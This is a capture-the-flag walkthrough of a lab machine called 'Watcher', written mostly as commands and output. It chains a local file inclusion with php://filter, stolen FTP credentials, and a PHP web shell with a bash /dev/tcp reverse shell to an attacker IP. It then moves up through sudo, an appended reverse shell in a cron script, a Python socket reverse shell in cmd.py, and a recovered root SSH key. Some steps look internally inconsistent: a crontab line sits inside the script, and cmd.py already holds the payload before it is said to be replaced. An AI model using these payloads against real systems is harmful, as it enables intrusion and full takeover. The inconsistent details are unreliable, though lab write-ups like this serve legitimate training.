# Watcher CTF Write-Up

## Overview

This walkthrough documents the compromise of the Watcher machine from initial reconnaissance through final root access. The challenge follows a realistic multi-step privilege escalation path: local file inclusion (LFI), FTP credential theft, web shell deployment, user pivoting via `sudo`, chained privilege escalation through a writable script dependency, and final SSH key recovery to root.

The attack path is:

- enumerate exposed services
- identify an LFI vulnerability in the web application
- read a protected file via `php://filter`
- recover FTP credentials from the leaked file
- upload a PHP reverse shell through FTP
- obtain a web shell as `www-data`
- use `sudo -l` to escalate to `toby`
- abuse a cron-triggered script to escalate to `mat`
- exploit a Python import dependency through `sudo -u will`
- discover a base64-encoded SSH private key in `/opt/backups`
- log in as `root` with the recovered key and read the final flag

---

## 1. Initial Reconnaissance

### Port Scan

The first step is to identify which services are exposed on the target.

```bash
nmap 10.114.151.17
```

### Result

```text
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-30 12:13 -0400
Nmap scan report for 10.114.151.17
Host is up (0.10s latency).
Not shown: 997 closed tcp ports (reset)

PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

This reveals a small Linux host exposing FTP, SSH, and an HTTP service. The web application immediately becomes the likely entry point.

![Image Placeholder: Nmap scan output](./assets/nmap-scan.png)

---

## 2. Web Enumeration and First Flags

### Directory Discovery

A quick wordlist scan is used to inspect the web root for interesting files.

```bash
feroxbuster -u http://10.114.151.17/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
```

### Relevant Output

```text
http://10.114.151.17/secret_file_do_not_read.txt
http://10.114.151.17/flag_1.txt
```

The direct file access is suspicious because the challenge names a file specifically as "do not read".

### Recovering Flag 1

```bash
curl http://10.114.151.17/flag_1.txt
```

```text
FLAG{first_flag_here}
```

This confirms the application is designed to expose a flag-like artifact, and the next target is the restricted file.

### Attempt to Read the Protected File

```bash
curl http://10.114.151.17/secret_file_do_not_read.txt
```

```text
Permission denied
```

This failure is expected, and it becomes the clue that the challenge is likely relying on local file inclusion or a file read bypass technique.

![Image Placeholder: Web root files](./assets/web-root.png)

---

## 3. Local File Inclusion (LFI)

### Discovery of the Vulnerable Parameter

The application appears to contain a parameterized web page:

```bash
curl 'http://10.114.151.17/post.php?post=striped.php'
```

This suggests the application includes a file based on the `post` parameter without sufficient validation.

### Testing the LFI

```bash
curl 'http://10.114.151.17/post.php?post=../../../../../etc/passwd'
```

### Result

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List ...
```

This confirms an LFI issue. The attacker can read arbitrary local files from the web server.

### Reading the Protected File via PHP Filters

The challenge specifically expects the use of PHP’s file filter stream wrapper to read the file without direct access restrictions.

```bash
curl 'http://10.114.151.17/post.php?post=php://filter/read=convert.base64-encode/resource=secret_file_do_not_read.txt'
```

### Extracted Base64

```text
SGkgTWF0LAoKVGhlIGNyZWRlbnRpYWxzIGZvciB0aGUgRlRQIHNlcnZlciBhcmUgYmVsb3cuIEkndmUgc2V0IHRoZSBmaWxlcyB0byBiZSBzYXZlZCB0byAvaG9tZS9mdHB1c2VyL2Z0cC9maWxlcy4KCldpbGwKCi0tLS0tLS0tLS0KCmZ0cHVzZXI6Z2l2ZW1lZmlsZXM3NzcK
```

### Decoding the Response

```bash
echo 'SGkgTWF0LAoKVGhlIGNyZWRlbnRpYWxzIGZvciB0aGUgRlRQIHNlcnZlciBhcmUgYmVsb3cuIEkndmUgc2V0IHRoZSBmaWxlcyB0byBiZSBzYXZlZCB0byAvaG9tZS9mdHB1c2VyL2Z0cC9maWxlcy4KCldpbGwKCi0tLS0tLS0tLS0KCmZ0cHVzZXI6Z2l2ZW1lZmlsZXM3NzcK' | base64 -d
```

### Decoded Output

```text
Hi Mat,

The credentials for the FTP server are below. I've set the files to be saved to /home/ftpuser/ftp/files.

Will

----------

ftpuser:givemefiles777
```

This reveals the FTP username and password.

> Important: The LFI vulnerability was not directly enough to read the hidden file, so the challenge used PHP’s `php://filter` stream to bypass the normal web access restrictions and reveal credentials.

---

## 4. FTP Access and File Upload

### Attempted FTP Login

```bash
ftp 10.114.151.17
```

```text
Name: ftpuser
Password: givemefiles777
```

### FTP Enumeration

```ftp
ftp> ls
```

```text
drwxr-xr-x    2 1001     1001         4096 Dec 03  2020 files
-rw-r--r--    1 0        0              21 Dec 03  2020 flag_2.txt
```

The challenge reveals two important things:

- `/home/ftpuser/ftp/files` is writable by the FTP user
- there is a `flag_2.txt` file to read

### Reading the Flag 2

```ftp
ftp> get flag_2.txt
```

This yields the second flag.

### Writing a Reverse Shell into the FTP Upload Directory

The FTP user has write access to the `files/` directory, which makes it a practical staging point for a PHP web shell.

```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.131.124/4444 0>&1'");
```

Stored as:

```text
shell2.php
```

Then the file is uploaded to the FTP directory.

```ftp
ftp> put shell2.php
```

---

## 5. Exploiting the LFI to Execute the Shell

Once the file is in the writable FTP directory, it can be included through the vulnerable parameter.

```bash
curl 'http://10.114.151.17/post.php?post=../../../../../..//home/ftpuser/ftp/files/shell2.php'
```

### Reverse Shell Callback

On the attack box:

```bash
nc -lvnp 4444
```

### Result

```text
connect to [192.168.131.124] from (UNKNOWN) [10.114.151.17] ...
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

This establishes a foothold as the web server user `www-data`.

![Image Placeholder: Reverse shell connection](./assets/reverse-shell.png)

---

## 6. Privilege Escalation to `toby`

### Checking Sudo Rights

```bash
sudo -l
```

### Result

```text
Matching Defaults entries for www-data on ip-10-114-151-17:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-114-151-17:
    (toby) NOPASSWD: ALL
```

This is a critical misconfiguration: `www-data` can execute arbitrary commands as `toby` without a password.

### Switching User

```bash
sudo -u toby /bin/bash
```

### ConfirmingIdentity

```bash
id
```

```text
uid=1003(toby) gid=1003(toby) groups=1003(toby)
```

The attacker is now operating as `toby`.

---

## 7. Enumeration as `toby`

### Home Directory Review

```bash
ls -la
```

```text
total 44
drwxr-xr-x 6 toby toby 4096 Dec 12  2020 .
drwxr-xr-x 7 root root 4096 Oct 30 16:12 ..
------- 1 toby toby   21 Dec  3  2020 flag_4.txt
drwxrwxr-x 2 toby toby 4096 Dec  3  2020 jobs
-rw-r--r-- 1 mat  mat    89 Dec 12  2020 note.txt
```

There is a `jobs/` directory and a note file, which strongly suggests automation or cron-based privilege escalation.

### Reading the First User Flag

```bash
cat flag_4.txt
```

This exposes the fourth flag and confirms the user-level progression.

### Inspecting the Job Script

```bash
cd jobs
ls -la
cat cow.sh
```

```bash
#!/bin/bash
cp /home/mat/cow.jpg /tmp/cow.jpg
*/1 * * * * mat /home/toby/jobs/cow.sh
```

This file is highly suspicious. It is executed by `mat` via cron, and it contains an obvious injection style pattern. The note indicates that the script is being used as a cron job to copy `/home/mat/cow.jpg` to `/tmp` and then later appended with a reverse shell payload.

---

## 8. Escalation from `toby` to `mat`

### Malicious Payload Injection

The raw notes describe the attack as follows:

```bash
echo "sh -i >& /dev/tcp/192.168.131.124/7772 0>&1" >> /home/toby/jobs/cow.sh
```

Because `mat` appears to be the cron user or task owner, the scheduled script eventually executes the appended payload as `mat` once the cron period elapses.

### Reverse Shell Callback

On the attacker machine:

```bash
nc -lvnp 7772
```

### Result

```text
$ id
uid=1002(mat) gid=1002(mat) groups=1002(mat)
```

The attacker now has a shell as `mat`.

![Image Placeholder: Mat shell](./assets/mat-shell.png)

---

## 9. Enumeration as `mat`

### Reviewing the Home Directory

```bash
ls -la
```

```text
total 312
drwxr-xr-x 6 mat  mat  4096 Dec  3  2020 .
drwxr-xr-x 7 root root 4096 Oct 30 16:12 ..
-rw-r--r-- 1 mat  mat 270433 Dec  3  2020 cow.jpg
-rw------- 1 mat  mat 37 Dec  3  2020 flag_5.txt
-rw-r--r-- 1 will will 141 Dec  3  2020 note.txt
drwxrwxr-x 2 will will 4096 Dec  3  2020 scripts
```

### Reading the Flag

```bash
cat flag_5.txt
```

The fifth flag is recovered.

### Inspecting the `scripts` Directory

```bash
cd scripts
ls -la
cat will_script.py
```

```python
import os
import sys
from cmd import get_command

cmd = get_command(sys.argv[1])

whitelist = ["ls -lah", "id", "cat /etc/passwd"]

if cmd not in whitelist:
        print("Invalid command!")
        exit()

os.system(cmd)
```

This script imports `get_command` from a module named `cmd`. The interesting bit is that the script is executed from a directory controlled by the user (`mat`), and the file `cmd.py` is present in the same folder.

### Inspecting the Dependency File

```bash
cat cmd.py
```

```python
import socket, os, pty

def get_command(num):
    if num == "1":
        return "ls -lah"
    if num == "2":
        return "id"
    if num == "3":
        return "cat /etc/passwd"
    return ""

# Reverse shell payload
RHOST = "192.168.131.124"
RPORT = 7773

s = socket.socket()
s.connect((RHOST, RPORT))
for fd in (0, 1, 2):
    os.dup2(s.fileno(), fd)
pty.spawn("/bin/sh")
```

This is the key insight: the script depends on `cmd.py`, and because the directory is writable or can be altered by the attacker, the dependency can be replaced with malicious code. The goal is to run it under a higher-privileged context.

---

## 10. Privilege Escalation to `will`

### Checking Sudo Permissions

```bash
sudo -l
```

```text
Matching Defaults entries for mat on ip-10-114-151-17:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mat may run the following commands on ip-10-114-151-17:
    (will) NOPASSWD: /usr/bin/python3 /home/mat/scripts/will_script.py *
```

This is a classic sudo privilege escalation vector: `mat` can run a Python script as `will` without a password.

### Launching the Script as `will`

```bash
sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py *
```

### Result

```text
#id
uid=1000(will) gid=1000(will) groups=1000(will),4(adm)
```

The malicious `cmd.py` was imported and executed under `will` context, which is enough to obtain a higher-privileged shell.

---

## 11. Enumeration as `will`

### Listing the Home Directory

```bash
ls -la
```

```text
total 36
drwxr-xr-x 5 will will 4096 Dec  3  2020 .
drwxr-xr-x 7 root root 4096 Oct 30 16:12 ..
lrwxrwxrwx 1 will will    9 Dec  3  2020 .bash_history -> /dev/null
-rw-r--r-- 1 will will  220 Dec  3  2020 .bash_logout
-rw-r--r-- 1 will will 3771 Dec  3  2020 .bashrc
... 
-rw------- 1 will will   41 Dec  3  2020 flag_6.txt
```

### Reading Flag 6

```bash
cat flag_6.txt
```

The sixth flag is recovered.

### Reviewing the Next Useful Discovery

The user is in `/opt/backups`, which is a directory that likely contains some backup artifact or SSH material.

```bash
cd /opt
ls -la
cd backups
ls -la
```

```text
drwxrwx--- 2 root adm  4096 Dec  3  2020 .
drwxr-xr-x 3 root root 4096 Oct 30 16:12 ..
-rw-rw---- 1 root adm  2270 Dec  2020 key.b64
```

This is a critical clue: a base64-encoded private key is stored in a root-owned directory with group write permissions (`adm`).

---

## 12. Recovering the Root SSH Key

### Reading the Encoded Key

```bash
cat key.b64
```

The file contains an RSA private key encoded in Base64.

```text
LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlFcEFJQkFBS0NBUUVBelBhUUZvbFFx...
```

### Manual Decode with Base64

```bash
echo 'LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlFcEFJQkFBS0NBUUVBelBhUUZvbFFx...' | base64 -d
```

Result:

```text
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAzPaQFolQq8cHom9mssyPZ53aLzBcRyBw+rysJ3h0JCxnV+aG
...
-----END RSA PRIVATE KEY-----
```

This is the root SSH key material needed to authenticate to the host.

### Saving the Key

```bash
cat > witcher <<'EOF'
-----BEGIN RSA PRIVATE KEY-----
...
-----END RSA PRIVATE KEY-----
EOF
chmod 600 witcher
```

Then the attacker connects to the machine over SSH with the private key.

```bash
ssh -i witcher root@10.114.151.17
```

### Result

```text
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-138-generic x86_64)
...
root@ip-10-114-151-17:~# id
uid=0(root) gid=0(root) groups=0(root)
```

The challenge is effectively complete: root access has been achieved.

![Image Placeholder: SSH as root with private key](./assets/root-ssh.png)

---

## 13. Final Flag Retrieval

### Reading the Root Flag

```bash
ls -la /root
cat /root/flag_7.txt
```

```text
FLAG{who_watches_the_watchers}
```

This is the final challenge flag.

---

## 14. Trial and Error / Failed Attempts and Dead Ends

This section reflects the realistic workflow of the challenge and documents the steps that did not work or were not sufficient.

### FTP Anonymous Access Failed

Initial suspicion was that anonymous FTP might be enabled. The attempt failed.

```bash
ftp 10.114.151.17
```

```text
Name: anonymous
Password: anonymous@
```

Result: access denied.

This was a dead end and forced the attacker to pivot to the web application.

### Reading the Protected File Directly Failed

The first idea was to access the suspicious file directly in the browser:

```bash
curl http://10.114.151.17/secret_file_do_not_read.txt
```

```text
Permission denied
```

This proved the file could not be loaded normally, which led to the LFI and `php://filter` technique.

### Initial LFI Attempts Were Not Fully Conclusive

The attacker tested a basic parameter to see whether the application reflected the file path:

```bash
curl 'http://10.114.151.17/post.php?post=striped.php'
```

It was not immediately obvious that the page accepted arbitrary file input until a deeper path traversal test succeeded.

```bash
curl 'http://10.114.151.17/post.php?post=../../../../../etc/passwd'
```

Once the path traversal returned `/etc/passwd`, the attack path became clear.

### Initial Key Analysis Was Unclear

When the base64 key file was found in `/opt/backups`, the first instinct was to inspect it with general-purpose utilities such as `strings` or binary analysis tools. These efforts were not sufficient to understand the artifact immediately.

```bash
strings key.b64
binwalk key.b64
file key.b64
```

The output was not obviously actionable at first; the key had to be recognized as a Base64-encoded private key, then decoded before it could be used.

### SSH Login Attempts with Wrong Credentials or Improper Key Handling Failed

The private key had to be saved exactly and the permissions set properly:

```bash
chmod 600 witcher
ssh -i witcher root@10.114.151.17
```

If the key file permissions are too open, SSH rejects it. This is a common troubleshooting issue when handling private keys.

### Slow Cron Delay Was a False Alarm Until the Reverse Shell Worked

The `toby` to `mat` escalation relied on a cron-driven script. The attacker had to wait for the next scheduled execution before the malicious command fireed. The timeout was not a failure in the exploit itself, but a timing issue that required patience.

> The challenge is intentionally realistic: not every attempt succeeds immediately. Re-reading the artifacts, validating the file permissions, and understanding the execution flow are essential to solving the machine.

---

## 15. Summary of the Exploit Chain

1. Scanned the host with `nmap` and identified FTP, SSH, and HTTP.
2. Enumerated the web application and extracted `flag_1.txt`.
3. Found a hidden file and used LFI with PHP stream filters to recover FTP credentials.
4. Logged into FTP as `ftpuser` and uploaded a PHP reverse shell.
5. Triggered the shell through `post.php?post=...` to gain a `www-data` foothold.
6. Used `sudo -l` to run commands as `toby`.
7. Altered a cron-driven script to pivot into a `mat` shell.
8. Abused a `sudo` rule to run a Python script as `will` and hijacked the imported dependency.
9. Found a base64-encoded SSH private key in `/opt/backups`.
10. Decoded the key, used it to authenticate as `root`, and retrieved the final flag.

---

## 16. Key Takeaways

- LFI vulnerabilities can be silently abused through file inclusion and stream wrappers like `php://filter`.
- Hidden or protected files often disclose credentials through indirect read paths.
- FTP writable directories can be leveraged for web shell staging.
- `sudo -l` inspection is often the most important step in post-exploitation.
- Cron jobs and imported Python modules are common privilege escalation opportunities when writable or replaceable.
- Root SSH private keys can be left in backup locations with weak permissions or improper ownership.

> This challenge proved that a proper escalation flow is often multi-layered: each user account reveals the next weakness, and each step narrows the attack path toward root.

---

## 17. Relevant Commands

```bash
nmap 10.114.151.17
feroxbuster -u http://10.114.151.17/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
curl http://10.114.151.17/flag_1.txt
curl http://10.114.151.17/secret_file_do_not_read.txt
curl 'http://10.114.151.17/post.php?post=../../../../../etc/passwd'
curl 'http://10.114.151.17/post.php?post=php://filter/read=convert.base64-encode/resource=secret_file_do_not_read.txt'
echo '...' | base64 -d
ftp 10.114.151.17
nc -lvnp 4444
sudo -l
sudo -u toby /bin/bash
ls -la
cat flag_4.txt
cat /home/toby/jobs/cow.sh
nc -lvnp 7772
sudo -l
sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py *
ls -la /opt/backups
cat /opt/backups/key.b64
echo '...' | base64 -d > witcher
chmod 600 witcher
ssh -i witcher root@10.114.151.17
cat /root/flag_7.txt
```

---

## Final Result

The Watcher challenge was successfully completed by exploiting a chain of web, FTP, sudo, cron, and Python import issues. The machine was ultimately compromised to `root`, and the final flag was retrieved:

```text
FLAG{who_watches_the_watchers}
```

![Image Placeholder: Final challenge completion](./assets/final-result.png)
